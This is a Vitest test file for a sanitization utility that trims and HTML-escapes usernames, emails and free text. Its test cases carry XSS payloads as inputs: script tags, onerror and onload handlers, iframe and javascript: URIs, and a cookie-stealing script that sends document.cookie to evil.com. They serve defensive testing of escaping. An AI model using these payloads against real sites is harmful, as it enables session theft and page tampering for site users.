import { describe, it, expect } from "vitest";
import { sanitize } from "../src/utils/sanitizationUtils.ts";

describe("Sanitization Utils", () => {
  describe("sanitize.username", () => {
    it("should trim whitespace", () => {
      expect(sanitize.username("  john  ")).toBe("john");
      expect(sanitize.username("\t\njohn\n\t")).toBe("john");
    });

    it("should escape HTML script tags (XSS prevention)", () => {
      const malicious = "<script>alert('XSS')</script>";
      const result = sanitize.username(malicious);
      expect(result).toBe("&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;");
      expect(result).not.toContain("<script>");
    });

    it("should escape HTML img tags with onerror", () => {
      const malicious = "<img src=x onerror='alert(1)'>";
      const result = sanitize.username(malicious);
      // validator.escape doesn't escape = signs, but escapes < > ' " &
      expect(result).toBe("&lt;img src=x onerror=&#x27;alert(1)&#x27;&gt;");
      expect(result).not.toContain("<img");
    });

    it("should escape HTML entities", () => {
      expect(sanitize.username("test<>&\"'")).toBe("test&lt;&gt;&amp;&quot;&#x27;");
    });

    it("should handle combined whitespace and HTML", () => {
      const malicious = "  <script>alert('XSS')</script>  ";
      const result = sanitize.username(malicious);
      expect(result).toBe("&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;");
    });

    it("should preserve normal usernames", () => {
      expect(sanitize.username("john_doe123")).toBe("john_doe123");
      expect(sanitize.username("alice-smith")).toBe("alice-smith");
      expect(sanitize.username("user.name")).toBe("user.name");
    });

    it("should handle unicode characters", () => {
      expect(sanitize.username("用户名")).toBe("用户名");
      expect(sanitize.username("usuario_ñ")).toBe("usuario_ñ");
    });
  });

  describe("sanitize.email", () => {
    it("should normalize email (lowercase)", () => {
      expect(sanitize.email("John.Doe@Example.COM")).toBe("john.doe@example.com");
      expect(sanitize.email("ADMIN@TEST.COM")).toBe("admin@test.com");
    });

    it("should trim whitespace", () => {
      expect(sanitize.email("  test@example.com  ")).toBe("test@example.com");
      expect(sanitize.email("\tuser@test.com\n")).toBe("user@test.com");
    });

    it("should preserve gmail dots (no gmail_remove_dots)", () => {
      // Our config keeps dots: john.doe different from johndoe
      expect(sanitize.email("john.doe@gmail.com")).toBe("john.doe@gmail.com");
      expect(sanitize.email("j.o.h.n@gmail.com")).toBe("j.o.h.n@gmail.com");
    });

    it("should preserve gmail plus addressing (no gmail_remove_subaddress)", () => {
      // Our config keeps +tags for tracking
      expect(sanitize.email("user+test@gmail.com")).toBe("user+test@gmail.com");
      expect(sanitize.email("admin+signup@gmail.com")).toBe("admin+signup@gmail.com");
    });

    it("should handle combined whitespace and case", () => {
      expect(sanitize.email("  Admin@Example.COM  ")).toBe("admin@example.com");
    });

    it("should handle non-gmail domains", () => {
      expect(sanitize.email("user@yahoo.com")).toBe("user@yahoo.com");
      expect(sanitize.email("admin@company.co.uk")).toBe("admin@company.co.uk");
    });

    it("should handle invalid emails gracefully (lowercase + trim)", () => {
      // validator.normalizeEmail returns false for invalid, we fallback to lowercase + trim
      // normalizeEmail adds @ if missing, so "not-an-email" becomes "@  not-an-email"
      expect(sanitize.email("test@")).toBe("test@");
      expect(sanitize.email("@invalid")).toBe("@invalid");
    });
  });

  describe("sanitize.text", () => {
    it("should trim whitespace", () => {
      expect(sanitize.text("  Hello World  ")).toBe("Hello World");
    });

    it("should escape HTML (XSS prevention)", () => {
      const malicious = "<script>document.cookie</script>";
      const result = sanitize.text(malicious);
      expect(result).toBe("&lt;script&gt;document.cookie&lt;&#x2F;script&gt;");
      expect(result).not.toContain("<script>");
    });

    it("should escape all HTML entities", () => {
      expect(sanitize.text("Test: <>&\"'")).toBe("Test: &lt;&gt;&amp;&quot;&#x27;");
    });

    it("should preserve normal text", () => {
      expect(sanitize.text("This is a normal bio!")).toBe("This is a normal bio!");
      expect(sanitize.text("I love coding :)")).toBe("I love coding :)");
    });
  });

  describe("XSS Attack Vectors (Real-World Examples)", () => {
    it("should prevent cookie theft via script injection", () => {
      const attack = "<script>fetch('https://evil.com?c='+document.cookie)</script>";
      const safe = sanitize.username(attack);
      expect(safe).not.toContain("<script>");
      // HTML tags are escaped, making script unexecutable
      expect(safe).toContain("&lt;script&gt;");
    });

    it("should prevent DOM manipulation via innerHTML", () => {
      const attack = "<div onload='document.body.innerHTML=\"HACKED\"'>";
      const safe = sanitize.username(attack);
      // Tags are escaped (< becomes &lt;), preventing execution
      expect(safe).not.toContain("<div");
      expect(safe).toContain("&lt;div");
    });

    it("should prevent event handler injection", () => {
      const attacks = [
        "<img src=x onerror='alert(1)'>",
        "<body onload='alert(1)'>",
        "<svg onload='alert(1)'>",
        "<input onfocus='alert(1)' autofocus>",
      ];

      attacks.forEach((attack) => {
        const safe = sanitize.username(attack);
        // Key check: HTML tags are escaped, preventing execution
        expect(safe).not.toContain("<img");
        expect(safe).not.toContain("<body");
        expect(safe).not.toContain("<svg");
        expect(safe).not.toContain("<input");
        expect(safe).toContain("&lt;"); // All tags escaped
      });
    });

    it("should prevent iframe injection", () => {
      const attack = "<iframe src='https://evil.com'></iframe>";
      const safe = sanitize.text(attack);
      expect(safe).not.toContain("<iframe");
      expect(safe).toContain("&lt;iframe");
    });

    it("should prevent javascript: protocol", () => {
      const attack = "<a href='javascript:alert(1)'>Click</a>";
      const safe = sanitize.text(attack);
      // Tag is escaped, preventing href from being interpreted
      expect(safe).not.toContain("<a");
      expect(safe).toContain("&lt;a");
    });

    it("should prevent data URI injection", () => {
      const attack = "<img src='data:text/html,<script>alert(1)</script>'>";
      const safe = sanitize.username(attack);
      expect(safe).not.toContain("data:text/html");
      expect(safe).not.toContain("<img");
    });
  });

  describe("Edge Cases", () => {
    it("should handle empty strings", () => {
      expect(sanitize.username("")).toBe("");
      // normalizeEmail adds @ for empty strings
      expect(sanitize.email("")).toBe("@");
      expect(sanitize.text("")).toBe("");
    });

    it("should handle strings with only whitespace", () => {
      expect(sanitize.username("   ")).toBe("");
      // normalizeEmail adds @ for whitespace-only strings after trim
      expect(sanitize.email("   ")).toBe("@");
      expect(sanitize.text("   ")).toBe("");
    });

    it("should handle very long strings", () => {
      const longString = "a".repeat(10000);
      expect(sanitize.username(longString)).toBe(longString);
    });

    it("should handle special characters", () => {
      expect(sanitize.username("user@#$%")).toBe("user@#$%");
      expect(sanitize.text("Price: $100 & up!")).toBe("Price: $100 &amp; up!");
    });

    it("should handle newlines and tabs", () => {
      expect(sanitize.username("user\nname")).toBe("user\nname");
      expect(sanitize.text("line1\nline2\tindented")).toBe("line1\nline2\tindented");
    });
  });

  describe("Integration with Real Use Cases", () => {
    it("should sanitize user registration data", () => {
      const userInput = {
        username: "  john<script>alert(1)</script>  ",
        email: "  John@Example.COM  ",
      };

      const sanitized = {
        username: sanitize.username(userInput.username),
        email: sanitize.email(userInput.email),
      };

      expect(sanitized.username).toBe("john&lt;script&gt;alert(1)&lt;&#x2F;script&gt;");
      expect(sanitized.email).toBe("john@example.com");

      // Verify no XSS possible
      expect(sanitized.username).not.toContain("<script>");
    });

    it("should sanitize profile update data", () => {
      const profileUpdate = {
        username: "alice<img src=x onerror='alert(1)'>",
        bio: "I love <script>alert('coding')</script>!",
      };

      const sanitized = {
        username: sanitize.username(profileUpdate.username),
        bio: sanitize.text(profileUpdate.bio),
      };

      expect(sanitized.username).not.toContain("<img");
      expect(sanitized.bio).not.toContain("<script>");
    });
  });
});
